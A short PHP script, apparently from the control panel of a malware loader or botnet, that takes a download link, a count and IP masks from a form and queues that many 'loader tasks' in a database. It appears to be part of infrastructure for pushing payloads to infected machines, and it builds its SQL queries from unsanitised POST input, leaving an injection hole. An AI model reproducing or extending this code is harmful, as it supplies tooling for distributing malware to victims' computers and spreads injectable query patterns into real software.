<?php

require_once 'mod_dbase.php';

$dbase = db_open();
if (!$dbase) exit;

$loadlink = $_POST['loadlink'];
$loadscnt = $_POST['loadscnt'];
$ipmasks = $_POST['ipmasks'];
$note = $_POST['note'];
	
// Создаём глобальное задание
$sql = " INSERT INTO gtask_loader_t"
	 . " VALUES (null, '$loadlink', $loadscnt, '$ipmasks', '$note')";
$res = mysqli_query($dbase, $sql);
if (mysqli_affected_rows($dbase) != 1) {
	echo "Wrong query : (\"$sql\")";
	db_close($dbase);
	exit();
}

$idgtask = mysqli_insert_id($dbase);

for ($i = 0; $i < $loadscnt; $i++) {
	$sql = " INSERT INTO tasks_loader_t "
		 . " VALUES (null, $idgtask, NULL, 0, NULL)";
	$res = mysqli_query($dbase, $sql);
	if (mysqli_affected_rows($dbase) != 1) {
		echo "Cannot create task (\"$sql\")";
		db_close($dbase);
		exit();
	}
}

if ($loadscnt > 0)
	echo "<br><b>$loadscnt records</b> was <font class='ok'>successfully</font> inserted<br>";

db_close($dbase);

?>